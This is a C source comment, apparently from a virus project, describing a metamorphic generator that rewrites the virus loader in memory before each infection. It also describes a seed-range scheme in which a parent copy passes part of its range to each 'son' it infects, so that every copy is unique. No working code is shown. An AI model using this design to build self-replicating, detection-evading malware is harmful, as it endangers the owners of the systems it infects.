/*
** metamorph_self is a metamorphic generator for the virus loader.
**   It works by regenerating its own loader
**   (overwriting the one that is loaded in memory)
**   before it is copied by our virus later on.
**
**   The uint64_t seed[2] is the range of seeds that belongs to our virus.
**   seed[0] is the seed of the current virus.
**   seed[1] is the last seed that belongs to the current virus.
**   All the numbers that aren't in this range are owned by other UNIQUE copies
**   of this virus.
**
**   When a new virus is bred, the parent gives away a part of his seed range
**   to his child, losing ownership of the range given.
**
**   (1)    father[n, m]
**   (2)    father infects son
**   (3)    father[n, p] and son[p + 1, m] with n < p < m
